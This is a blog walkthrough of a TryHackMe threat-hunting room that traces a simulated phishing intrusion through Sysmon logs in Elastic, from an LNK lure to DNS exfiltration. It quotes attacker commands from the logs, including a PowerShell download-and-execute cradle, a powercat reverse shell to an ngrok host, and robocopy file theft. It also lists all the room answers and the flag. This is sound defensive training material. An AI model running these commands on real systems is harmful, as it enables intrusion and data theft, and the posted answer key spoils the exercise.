---
title: "TryHackMe Hunt Me I Payment Collectors: Phish to DNS Exfil"
date: 2026-08-11T15:20:00+05:30
lastmod: 2026-08-11T15:24:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-paycollect/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - SOC Level 2
  - Threat Hunting
  - Elastic
  - DFIR

draft: false
description: "Walkthrough of TryHackMe Hunt Me I Payment Collectors: tracing a phish from an LNK lure through a powercat shell, PowerView recon, and DNS exfiltration."
---

## Hunt Me I: Payment Collectors

The Hunt Me rooms swap the guided tactic-by-tactic format for a single Sysmon-heavy Elastic index and a scoreboard: a Finance Director, Michael Ascot at SwiftSpend, opened a phishing attachment, and you have 14 questions to reconstruct exactly what happened. Everything lives in one `winlogbeat` index, so the whole hunt is one long pivot from the first double-click to the last DNS query.

![The Hunt Me I Payment Collectors room on TryHackMe marked Room completed 100 percent, all 14 questions answered](/img/thm-paycollect/01-room.png)

## Initial access: the LNK lure

The attachment Michael downloaded was **`Invoice_AT_2023-227.zip`**, and inside it was **`Payment_Invoice.pdf.lnk.lnk`**, a shortcut wearing a double extension to look like a PDF. Double-clicking it spawned **`powershell.exe`** from explorer, and that PowerShell immediately reached out for a reverse-shell tool.

![Terminal card of the initial access and recon: the LNK lure, the powercat reverse shell, and PowerView download](/img/thm-paycollect/02-access-recon.png)

The command was a classic download cradle: `IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')`, followed by `powercat -c 2.tcp.ngrok.io -p 19282 -e powershell`. So the reverse-shell tool URL is **powercat.ps1** on GitHub, and the workstation called back to the attacker's ngrok tunnel on port **`19282`**.

## Discovery

With a shell, the attacker enumerated the host. The first native Windows binary they ran for system enumeration was **`systeminfo.exe`**, followed by `whoami`, `net user`, and `net localgroup`. To map the domain they pulled a well-known recon script, **PowerView**, from `https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1`, whose function bodies (Convert-NameToSid and friends) show up verbatim in the PowerShell script-block logs.

## Collection

Domain recon pointed the attacker at a finance file share. They mapped it with `net use Z: \\FILESRV-01\SSF-FinancialRecords`, so the share name is **`SSF-FinancialRecords`**, then bulk-copied it with `Robocopy . C:\Users\michael.ascot\downloads\exfiltration /E`. The copy destination is **`C:\Users\michael.ascot\downloads\exfiltration`**, and among the stolen files was **`ClientPortfolioSummary.xlsx`**.

![Terminal card of the collection and exfiltration: the mapped share, robocopy, and the nslookup DNS exfil chunks](/img/thm-paycollect/03-collect-exfil.png)

## Exfiltration over DNS

The loot was staged into an archive with `Compress-Archive`, producing **`exfilt8me.zip`**. The clever part is how it left the network: there is no HTTP upload in the logs at all. Instead, the ZIP was base64-encoded, split into chunks, and smuggled out one **`nslookup`** query at a time, each chunk becoming a subdomain of the attacker's server. That makes the technique **`T1048`** (Exfiltration Over Alternative Protocol), and the destination domain is **`haz4rdw4re.io`**.

Because every chunk is visible in the process command lines, the exfiltrated data can be rebuilt straight from the logs. The final two `nslookup` queries carry a second, smaller payload; concatenating and base64-decoding them (`VEhNezE0OTczMjFm...RmYjEyNGZiMTY1NjZlfQ==`) reconstructs the flag: **`THM{1497321f4f6f059a52dfb124fb16566e}`**.

![Card listing all fourteen answers for the room](/img/thm-paycollect/04-answers.png)

## Every answer

| # | Question | Answer |
|---|---|---|
| 1 | ZIP attachment | `Invoice_AT_2023-227.zip` |
| 2 | Extracted file | `Payment_Invoice.pdf.lnk.lnk` |
| 3 | Process from the file | `powershell.exe` |
| 4 | Reverse-shell tool URL | `.../besimorhino/powercat/master/powercat.ps1` |
| 5 | Callback port | `19282` |
| 6 | First enum binary | `systeminfo.exe` |
| 7 | Domain-enum script URL | `.../PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1` |
| 8 | Mapped file share | `SSF-FinancialRecords` |
| 9 | Copy destination | `C:\Users\michael.ascot\downloads\exfiltration` |
| 10 | Excel file from share | `ClientPortfolioSummary.xlsx` |
| 11 | Exfil archive | `exfilt8me.zip` |
| 12 | Exfil technique ID | `T1048` |
| 13 | Attacker server domain | `haz4rdw4re.io` |
| 14 | Reconstructed flag | `THM{1497321f4f6f059a52dfb124fb16566e}` |

## Wrap-up

Payment Collectors is a compact but complete intrusion, and its lesson is that a single well-instrumented log source, Sysmon shipped into Elastic, is enough to walk an attacker end to end. Process creation gave up the lure and the powercat callback, script-block logging exposed the PowerView recon, and the exfil, which deliberately avoided any HTTP that a proxy might catch, still left a perfect trail in `nslookup` command lines. The final flag being recoverable from those same DNS chunks is the room's point in miniature: the attacker's own covert channel is the analyst's evidence, right down to the bytes.
